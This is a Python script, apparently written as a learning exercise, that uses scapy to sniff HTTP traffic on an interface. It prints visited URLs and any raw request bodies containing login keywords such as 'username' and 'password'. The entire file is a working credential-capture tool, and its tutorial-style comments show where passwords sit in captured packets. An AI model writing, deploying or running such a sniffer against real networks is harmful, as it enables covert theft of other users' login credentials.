#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="udp")--here this doesnt work cz the bpf module does not support the filtering of http requests so we need to import a new scapy module
    #here porcess_sniffed_packet is user defined fuction to catch the packets generated by this sniff function and filter it further in that function

def process_sniffed_packet(packet):
    #after import the new scapy_http module we implement the below packet.haslayer(http.HTTPRequest): function here only packet variable is user defined
    if packet.haslayer(http.HTTPRequest):
        #adding packet.show() to see which layer will contain username and password fields
        # print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        #here http.HTTPRequest is the layer and Host is the field similarly for Path
        
        if packet.haslayer(scapy.Raw):
            #in future to search any layer or to filter it inside http module use scapy.layer_name eg:- packet.haslayer(scapy.Raw)
            # print(packet[scapy.Raw].load)
            #here .load is the field name as password and username are in Raw layer and inside Raw its in field named load
            #eg:- ###[ Raw ]###
            #     load      = 'username=hey%40hotmail.com&password=hellohellohellohello&anchor='
            capture_only_login_info = packet[scapy.Raw].load
            # if "username" in capture_only_login_info:
            #     print(capture_only_login_info)

            keywords = ["username", "user", "login", "password", "pass"]
            #hey keywords help like if the programmer has a input field such as user for username then the above keywords will help to capture it
            for keyword in keywords:
                if keyword in capture_only_login_info:
                    print(capture_only_login_info)
                    break
                    #Here **break** ensures that if the field of input contains many keywords such as user and username the it prints the results for such only one


sniff("eth0")
